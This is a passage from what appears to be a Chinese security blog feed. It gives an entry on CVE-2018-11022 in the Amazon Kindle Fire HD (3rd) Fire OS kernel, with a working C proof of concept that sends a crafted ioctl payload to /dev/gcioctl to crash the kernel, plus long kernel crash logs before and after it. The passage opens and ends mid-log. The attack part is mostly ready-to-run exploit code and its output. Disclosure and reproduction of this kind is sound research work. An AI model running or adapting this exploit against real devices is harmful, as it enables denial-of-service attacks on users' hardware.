00000001 00000000 c35b5f14 00000000 00000001</span><br><span class="line">[  147.524688] 5ec8  de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 d72400c0 00000004</span><br><span class="line">[  147.535339] 5ee8  d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 c0136044 c0489e60</span><br><span class="line">[  147.546020] 5f08  00000000 00000000 00000000 00000001 00000000 dd055190 dd5e7f68 c35b5f0c</span><br><span class="line">[  147.556579] Process rpmsg_omx_ioctl (pid: 3888, stack limit &#x3D; 0xc35b42f8)</span><br><span class="line">[  147.564270] Stack: (0xc35b5e60 to 0xc35b6000)</span><br><span class="line">[  147.569213] 5e60: d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  147.578430] 5e80: c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  147.587646] 5ea0: c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  147.596740] 5ec0: 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  147.605957] 5ee0: d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08</span><br><span class="line">[  147.615173] 5f00: c0136044 c0489e60 00000000 00000000 00000000 00000001 00000000 dd055190</span><br><span class="line">[  147.624389] 5f20: dd5e7f68 c35b5f0c c35b4000 be92f628 be92f5f8 c0085803 d72400c0 00000004</span><br><span class="line">[  147.633483] 5f40: c35b4000 00000000 c35b5f64 00000000 be92f5f8 c0085803 d72400c0 00000004</span><br><span class="line">[  147.642730] 5f60: c35b4000 00000000 c35b5fa4 c35b5f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  147.651947] 5f80: 00000400 be92f628 00010e54 00000000 00000036 c0013e08 00000000 c35b5fa8</span><br><span class="line">[  147.661010] 5fa0: c0013c60 c0136578 be92f628 00010e54 00000004 c0085803 be92f5f8 be92f5f8</span><br><span class="line">[  147.670104] 5fc0: be92f628 00010e54 00000000 00000036 00000000 00000000 00000000 be92f614</span><br><span class="line">[  147.679321] 5fe0: 00000000 be92f5dc 00010690 0002917c 60000010 00000004 00000017 579e6e78</span><br><span class="line">[  147.688537] Backtrace: </span><br><span class="line">[  147.691558] [&lt;c02e8534&gt;] (ion_free+0x0&#x2F;0xb4) from [&lt;c048a120&gt;] (rpmsg_omx_ioctl+0x2cc&#x2F;0x598)</span><br><span class="line">[  147.701049]  r6:00000003 r5:d71d5880 r4:be92f5f8 r3:d71d58ec</span><br><span class="line">[  147.708068] [&lt;c0489e54&gt;] (rpmsg_omx_ioctl+0x0&#x2F;0x598) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  147.717956] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  147.727203] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  147.736450]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:be92f628</span><br><span class="line">[  147.744873] Code: e7f001f2 e1a0c00d e92dd878 e24cb004 (e5915004) </span><br><span class="line">[  147.754913] Board Information: </span><br><span class="line">[  147.754913]  Revision : 0001</span><br><span class="line">[  147.754943]  Serial	: 0000000000000000</span><br><span class="line">[  147.754943] SoC Information:</span><br><span class="line">[  147.754943]  CPU	: OMAP4470</span><br><span class="line">[  147.754943]  Rev	: ES1.0</span><br><span class="line">[  147.754974]  Type	: HS</span><br><span class="line">[  147.754974]  Production ID: 0002B975-000000CC</span><br><span class="line">[  147.754974]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  147.755004] </span><br><span class="line">[  147.794616] ---[ end trace 50912198cfc81720 ]---</span><br><span class="line">[  147.799957] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  147.805847] CPU0: stopping</span><br><span class="line">[  147.808959] Backtrace: </span><br><span class="line">[  147.812133] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  147.821502]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950</span><br><span class="line">[  147.828643] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  147.837860] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  147.847259] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  147.856567] Exception stack(0xdd187b38 to 0xdd187b80)</span><br><span class="line">[  147.862243] 7b20:                                                       00000002 00000002</span><br><span class="line">[  147.871459] 7b40: 00000002 00000001 dd187bbc c1621100 c1621100 00c6a000 c1621108 00000001</span><br><span class="line">[  147.880676] 7b60: 00000001 dd187bac 00000002 dd187b80 c002398c c009ae48 200d0013 ffffffff</span><br><span class="line">[  147.889892]  r6:ffffffff r5:200d0013 r4:c009ae48 r3:c002398c</span><br><span class="line">[  147.896911] [&lt;c009add0&gt;] (generic_exec_single+0x0&#x2F;0x98) from [&lt;c009af78&gt;] (smp_call_function_single+0x110&#x2F;0x1e0)</span><br><span class="line">[  147.908325] [&lt;c009ae68&gt;] (smp_call_function_single+0x0&#x2F;0x1e0) from [&lt;c009b28c&gt;] (smp_call_function_many+0x244&#x2F;0x294)</span><br><span class="line">[  147.920104] [&lt;c009b048&gt;] (smp_call_function_many+0x0&#x2F;0x294) from [&lt;c009b48c&gt;] (smp_call_function+0x48&#x2F;0x74)</span><br><span class="line">[  147.931030] [&lt;c009b444&gt;] (smp_call_function+0x0&#x2F;0x74) from [&lt;c04310f4&gt;] (cpuidle_latency_notify+0x20&#x2F;0x28)</span><br><span class="line">[  147.941864]  r4:ffffffff r3:c04310d4</span><br><span class="line">[  147.946258] [&lt;c04310d4&gt;] (cpuidle_latency_notify+0x0&#x2F;0x28) from [&lt;c06a7154&gt;] (notifier_call_chain+0x4c&#x2F;0x8c)</span><br><span class="line">[  147.957305] [&lt;c06a7108&gt;] (notifier_call_chain+0x0&#x2F;0x8c) from [&lt;c006ebc0&gt;] (__blocking_notifier_call_chain+0x50&#x2F;0x68)</span><br><span class="line">[  147.969085]  r8:200d0013 r7:000000a0 r6:00000000 r5:ffffffff r4:c0a11df8</span><br><span class="line">[  147.977020] r3:ffffffff</span><br><span class="line">[  147.980499] [&lt;c006eb70&gt;] (__blocking_notifier_call_chain+0x0&#x2F;0x68) from [&lt;c006ebf8&gt;] (blocking_notifier_call_chain+0x20&#x2F;0x28)</span><br><span class="line">[  147.993133]  r7:de95183c r6:000000a0 r5:0000115c r4:c0a11d98</span><br><span class="line">[  148.000152] [&lt;c006ebd8&gt;] (blocking_notifier_call_chain+0x0&#x2F;0x28) from [&lt;c0088eec&gt;] (pm_qos_update_target+0xf8&#x2F;0x19c)</span><br><span class="line">[  148.011932] [&lt;c0088df4&gt;] (pm_qos_update_target+0x0&#x2F;0x19c) from [&lt;c008909c&gt;] (pm_qos_update_request+0x5c&#x2F;0x8c)</span><br><span class="line">[  148.023071] [&lt;c0089040&gt;] (pm_qos_update_request+0x0&#x2F;0x8c) from [&lt;c0411b18&gt;] (omap_i2c_xfer+0x2bc&#x2F;0x6c8)</span><br><span class="line">[  148.033599]  r5:dd187da0 r4:00000000</span><br><span class="line">[  148.038024] [&lt;c041185c&gt;] (omap_i2c_xfer+0x0&#x2F;0x6c8) from [&lt;c040e5cc&gt;] (i2c_transfer+0xb8&#x2F;0xf8)</span><br><span class="line">[  148.047637] [&lt;c040e514&gt;] (i2c_transfer+0x0&#x2F;0xf8) from [&lt;c040e930&gt;] (i2c_smbus_xfer+0x278&#x2F;0x588)</span><br><span class="line">[  148.057434] [&lt;c040e6b8&gt;] (i2c_smbus_xfer+0x0&#x2F;0x588) from [&lt;c040eedc&gt;] (i2c_smbus_read_word_data+0x3c&#x2F;0x4c)</span><br><span class="line">[  148.068267] [&lt;c040eea0&gt;] (i2c_smbus_read_word_data+0x0&#x2F;0x4c) from [&lt;c0418760&gt;] (bq27541_i2c_read.constprop.7+0x20&#x2F;0x54)</span><br><span class="line">[  148.080200] [&lt;c0418740&gt;] (bq27541_i2c_read.constprop.7+0x0&#x2F;0x54) from [&lt;c04189f0&gt;] (battery_handle_work+0x120&#x2F;0x6a4)</span><br><span class="line">[  148.091857]  r5:dd187e92 r4:dd08b920</span><br><span class="line">[  148.096374] [&lt;c04188d0&gt;] (battery_handle_work+0x0&#x2F;0x6a4) from [&lt;c0063278&gt;] (process_one_work+0x150&#x2F;0x468)</span><br><span class="line">[  148.107116] [&lt;c0063128&gt;] (process_one_work+0x0&#x2F;0x468) from [&lt;c00638c4&gt;] (worker_thread+0x13c&#x2F;0x320)</span><br><span class="line">[  148.117156] [&lt;c0063788&gt;] (worker_thread+0x0&#x2F;0x320) from [&lt;c0068af4&gt;] (kthread+0x90&#x2F;0x9c)</span><br><span class="line">[  148.126312] [&lt;c0068a64&gt;] (kthread+0x0&#x2F;0x9c) from [&lt;c004cd64&gt;] (do_exit+0x0&#x2F;0x7e0)</span><br><span class="line">[  148.134765]  r6:c004cd64 r5:c0068a64 r4:dd0aded4</span><br><span class="line">[  148.140533] CPU0 PC (0) : 0xc0019b2c</span><br><span class="line">[  148.144714] CPU0 PC (1) : 0xc0019b2c</span><br><span class="line">[  148.148773] CPU0 PC (2) : 0xc0019b2c</span><br><span class="line">[  148.152832] CPU0 PC (3) : 0xc0019b2c</span><br><span class="line">[  148.156890] CPU0 PC (4) : 0xc0019b2c</span><br><span class="line">[  148.161071] CPU0 PC (5) : 0xc0019b2c</span><br><span class="line">[  148.165130] CPU0 PC (6) : 0xc0019b2c</span><br><span class="line">[  148.169189] CPU0 PC (7) : 0xc0019b2c</span><br><span class="line">[  148.173370] CPU0 PC (8) : 0xc0019b2c</span><br><span class="line">[  148.177429] CPU0 PC (9) : 0xc0019b2c</span><br><span class="line">[  148.181488] CPU1 PC (0) : 0xc003ee38</span><br><span class="line">[  148.185668] CPU1 PC (1) : 0xc003ee54</span><br><span class="line">[  148.189727] CPU1 PC (2) : 0xc003ee54</span><br><span class="line">[  148.193786] CPU1 PC (3) : 0xc003ee54</span><br><span class="line">[  148.197967] CPU1 PC (4) : 0xc003ee54</span><br><span class="line">[  148.202026] CPU1 PC (5) : 0xc003ee54</span><br><span class="line">[  148.206085] CPU1 PC (6) : 0xc003ee54</span><br><span class="line">[  148.210266] CPU1 PC (7) : 0xc003ee54</span><br><span class="line">[  148.214324] CPU1 PC (8) : 0xc003ee54</span><br><span class="line">[  148.218383] CPU1 PC (9) : 0xc003ee54</span><br><span class="line">[  148.222442] </span><br><span class="line">[  148.224365] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  148.224365] </span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11022）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11022%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>mazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令<strong>3224132973，</strong>并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3224132973.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is gcicommit.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/gcioctl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/gcioctl&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3224132973</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0x00002020</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xeddad33f</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0xf16c7d8e</span>,</span><br><span class="line">    <span class="number">0x96489dd1</span>,</span><br><span class="line">    <span class="number">0x678a12ff</span>,</span><br><span class="line">    <span class="number">0x69812204</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  381.205780] Unable to handle kernel NULL pointer dereference at virtual address 00000004</span><br><span class="line">[  381.215637] pgd &#x3D; c30e4000</span><br><span class="line">[  381.219085] [00000004] *pgd&#x3D;97437831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">[  381.227355] Internal error: Oops: 817 [#1] PREEMPT SMP ARM</span><br><span class="line">[  381.233520] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  381.241302] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  381.248596] PC is at free_buffer+0x4c&#x2F;0x13c</span><br><span class="line">[  381.253479] LR is at down_timeout+0x40&#x2F;0x5c</span><br><span class="line">[  381.258209] pc : [&lt;c031716c&gt;]    lr : [&lt;c006e9b8&gt;]    psr: a0000013</span><br><span class="line">[  381.258209] sp : de943e58  ip : de943e38  fp : de943e6c</span><br><span class="line">[  381.271179] r10: 00000000  r9 : dd3e8ca8  r8 : c25e6598</span><br><span class="line">[  381.277160] r7 : eddad327  r6 : de942000  r5 : c0a25b50  r4 : c25e6580</span><br><span class="line">[  381.284454] r3 : 00000000  r2 : c0a25b64  r1 : c0a25b64  r0 : 00000000</span><br><span class="line">[  381.291870] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  381.299804] Control: 10c5387d  Table: 830e404a  DAC: 00000015</span><br><span class="line">[  381.306335] </span><br><span class="line">[  381.306365] PC: 0xc03170ec:</span><br><span class="line">[  381.311340] 70ec  e1a00001 e34c2091 e3a01a01 e30531e8 e34c306e ebfd3650 e89da800 e1a0c00d</span><br><span class="line">[  381.321868] 710c  e92dd800 e24cb004 ebffced4 e3a00000 e89da800 e1a0c00d e92dd830 e24cb004</span><br><span class="line">[  381.332550] 712c  e1a04000 e3020710 e59f510c ebf4dd18 e1a01000 e1a00005 ebf55e0b e3500000</span><br><span class="line">[  381.343078] 714c  1a000023 e5943000 e1540003 0a000008 e1a02005 e5940004 e5b21014 e5853014</span><br><span class="line">[  381.353759] 716c  e5832004 e5801000 e5810004 e5844000 e5844004 e59f00c0 ebf55d9f e3020710</span><br><span class="line">[  381.364440] 718c  e59f50b4 ebf4dd02 e1a01000 e285001c ebf55df5 e3500000 1a00001a e594201c</span><br><span class="line">[  381.375122] 71ac  e1a03005 e594c018 e2841018 e285001c e58c2004 e582c000 e5b32030 e5851030</span><br><span class="line">[  381.385681] 71cc  e5821004 e5842018 e584301c ebf55d8a e89da830 e1a03000 e3a02068 e59f105c</span><br><span class="line">[  381.396331] </span><br><span class="line">[  381.396362] LR: 0xc006e938:</span><br><span class="line">[  381.401306] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005</span><br><span class="line">[  381.411987] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4</span><br><span class="line">[  381.422668] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000</span><br><span class="line">[  381.433288] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794</span><br><span class="line">[  381.443817] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d</span><br><span class="line">[  381.454498] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008</span><br><span class="line">[  381.465179] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004</span><br><span class="line">[  381.475830] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d</span><br><span class="line">[  381.486358] </span><br><span class="line">[  381.486358] SP: 0xde943dd8:</span><br><span class="line">[  381.491455] 3dd8  de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff</span><br><span class="line">[  381.501983] 3df8  de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64</span><br><span class="line">[  381.512664] 3e18  c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8</span><br><span class="line">[  381.523315] 3e38  00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff</span><br><span class="line">[  381.533996] 3e58  00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028</span><br><span class="line">[  381.544525] 3e78  be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90</span><br><span class="line">[  381.555206] 3e98  de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141</span><br><span class="line">[  381.565734] 3eb8  41414141 41414141 41414141 41414141 41414141 d7b96700 de943efc de943ee0</span><br><span class="line">[  381.576293] </span><br><span class="line">[  381.576293] IP: 0xde943db8:</span><br><span class="line">[  381.581390] 3db8  de943dd4 de943dc8 c00795b4 c00792bc de943e0c de943dd8 c0070df8 c00795ac</span><br><span class="line">[  381.592071] 3dd8  de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff</span><br><span class="line">[  381.602630] 3df8  de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64</span><br><span class="line">[  381.613311] 3e18  c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8</span><br><span class="line">[  381.623870] 3e38  00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff</span><br><span class="line">[  381.634399] 3e58  00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028</span><br><span class="line">[  381.645080] 3e78  be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90</span><br><span class="line">[  381.655761] 3e98  de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141</span><br><span class="line">[  381.666442] </span><br><span class="line">[  381.666442] FP: 0xde943dec:</span><br><span class="line">[  381.671417] 3dec  c031716c a0000013 ffffffff de943e44 c25e6598 de943e6c de943e10 c06a5318</span><br><span class="line">[  381.681976] 3e0c  c0008370 00000000 c0a25b64 c0a25b64 00000000 c25e6580 c0a25b50 de942000</span><br><span class="line">[  381.692535] 3e2c  eddad327 c25e6598 dd3e8ca8 00000000 de943e6c de943e38 de943e58 c006e9b8</span><br><span class="line">[  381.703216] 3e4c  c031716c a0000013 ffffffff 00000000 be8075c8 de943f04 de943e70 c0317704</span><br><span class="line">[  381.713867] 3e6c  c031712c 00000001 00000028 be8075c8 de943ea0 de943e98 de943e90 c0207454</span><br><span class="line">[  381.724548] 3e8c  c00bd920 de943e90 de943e90 de943e98 de943e98 00000000 00000002 00000002</span><br><span class="line">[  381.735076] 3eac  eddad33f 41414141 41414141 41414141 41414141 41414141 41414141 41414141</span><br><span class="line">[  381.745758] 3ecc  d7b96700 de943efc de943ee0 c02089fc 00000000 d74f9540 00000004 d74f9540</span><br><span class="line">[  381.756408] </span><br><span class="line">[  381.756408] R1: 0xc0a25ae4:</span><br><span class="line">[  381.761383] 5ae4  00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff</span><br><span class="line">[  381.772064] 5b04  00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  381.782714] 5b24  00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101</span><br><span class="line">[  381.793273] 5b44  3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c</span><br><span class="line">[  381.803955] 5b64  00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80</span><br><span class="line">[  381.814605] 5b84  c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c</span><br><span class="line">[  381.825286] 5ba4  00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0</span><br><span class="line">[  381.835815] 5bc4  c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.846496] </span><br><span class="line">[  381.846496] R2: 0xc0a25ae4:</span><br><span class="line">[  381.851470] 5ae4  00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff</span><br><span class="line">[  381.862152] 5b04  00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  381.872802] 5b24  00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101</span><br><span class="line">[  381.883453] 5b44  3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c</span><br><span class="line">[  381.893981] 5b64  00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80</span><br><span class="line">[  381.904663] 5b84  c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c</span><br><span class="line">[  381.915344] 5ba4  00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0</span><br><span class="line">[  381.925872] 5bc4  c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.936523] </span><br><span class="line">[  381.936523] R4: 0xc25e6500:</span><br><span class="line">[  381.941619] 6500  00000002 00000000 d7a55550 00000000 00000000 00000000 c2410c00 000008a8</span><br><span class="line">[  381.952148] 6520  c0a10a88 00000000 c16281fc 00000000 00000000 00000000 00000000 000003e8</span><br><span class="line">[  381.962829] 6540  c25e6000 00000093 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.973480] 6560  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.984008] 6580  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.994689] 65a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.005340] 65c0  00000000 00000028 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.016021] 65e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.026519] </span><br><span class="line">[  382.026519] R5: 0xc0a25ad0:</span><br><span class="line">[  382.031616] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03</span><br><span class="line">[  382.042175] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  382.052856] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001</span><br><span class="line">[  382.063507] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001</span><br><span class="line">[  382.074157] 5b50  00000000 00000000 00000000 c0a25b5c c0a25b5c 00000000 c0a25b64 00000000</span><br><span class="line">[  382.084716] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000</span><br><span class="line">[  382.095245] 5b90  00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001</span><br><span class="line">[  382.105926] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8</span><br><span class="line">[  382.116577] </span><br><span class="line">[  382.116577] R6: 0xde941f80:</span><br><span class="line">[  382.121551] 1f80  de917b80 c00635cc 00000013 de84190c de917b80 c00635cc 00000013 00000000</span><br><span class="line">[  382.132202] 1fa0  00000000 00000000 de941ff4 de941fb8 c0068af4 c00635d8 00000000 00000000</span><br><span class="line">[  382.142730] 1fc0  de917b80 00000000 00000000 00000000 de941fd0 de941fd0 00000000 de84190c</span><br><span class="line">[  382.153259] 1fe0  c0068a64 c004cd64 00000000 de941ff8 c004cd64 c0068a70 00000000 00000000</span><br><span class="line">[  382.163940] 2000  00000000 00000002 00000000 dd0bd7c0 c0a0e840 00000000 00000015 c2de6540</span><br><span class="line">[  382.174621] 2020  00000000 de942000 c09ddc50 dd0bd7c0 de83d300 c1617b40 de943ba4 de943af0</span><br><span class="line">[  382.185150] 2040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  382.195800] 2060  01c454c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.206451] </span><br><span class="line">[  382.206451] R7: 0xeddad2a7:</span><br><span class="line">[  382.211425] d2a4  ******** ******** ******** ******** ******** ******** ******** 